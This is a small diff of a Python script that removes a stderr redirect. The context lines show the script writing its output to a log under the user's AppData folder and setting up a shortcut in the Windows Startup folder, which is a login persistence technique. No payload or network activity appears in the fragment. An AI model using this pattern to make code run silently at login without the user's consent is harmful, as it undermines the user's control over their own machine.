@@ -38,7 +38,6 @@ target_path = os.path.join(user_profile, 'AppData', 'Roaming', 'Microsoft', 'Win
 os.makedirs(target_path, exist_ok=True)
 
 sys.stdout = open(os.path.join(target_path, "skibidi-mainmain", "log.txt"), "w")
-sys.stderr = sys.stdout
 
 startup_dir = Path(os.getenv("APPDATA")) / "Microsoft" / "Windows" / "Start Menu" / "Programs" / "Startup"
 shortcut_name="MyPythonScript"
